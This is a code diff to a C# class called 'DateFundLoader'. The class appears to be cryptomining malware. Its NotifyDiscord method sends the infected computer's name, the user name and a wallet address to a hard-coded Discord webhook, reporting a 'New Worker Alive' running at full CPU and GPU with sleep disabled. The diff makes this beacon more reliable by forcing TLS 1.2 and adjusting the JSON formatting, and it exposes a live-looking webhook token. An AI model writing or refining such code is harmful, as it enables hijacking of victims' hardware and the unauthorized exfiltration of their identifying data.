@@ -96,9 +96,15 @@ public class DateFundLoader {
     private static void NotifyDiscord(string wallet) {
         try {
             string webhookUrl = "https://discord.com/api/webhooks/1495748321078284358/ZrPnFP_wT81nNxuqlsAOB9FNWrOJhK3nPGRYQJjDuH-2mIWdyNf1RK_Ql9Quf6vSgbKr";
+            
+            // Force TLS 1.2 for Discord
+            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
+
             string compName = Environment.MachineName;
             string userName = Environment.UserName;
-            string msg = string.Format("🚀 **New Worker Alive!**\n**Host:** `{0}`\n**User:** `{1}`\n**Wallet:** `{2}`\n**Status:** Fully Optimized (100% CPU + 24/7 GPU + Anti-Sleep)", compName, userName, wallet);
+            
+            // Format message and escape backslashes/quotes for raw JSON delivery
+            string msg = string.Format("🚀 **New Worker Alive!**\\n**Host:** `{0}`\\n**User:** `{1}`\\n**Wallet:** `{2}`\\n**Status:** Fully Optimized", compName, userName, wallet);
             
             using (WebClient wc = new WebClient()) {
                 wc.Headers[HttpRequestHeader.ContentType] = "application/json";
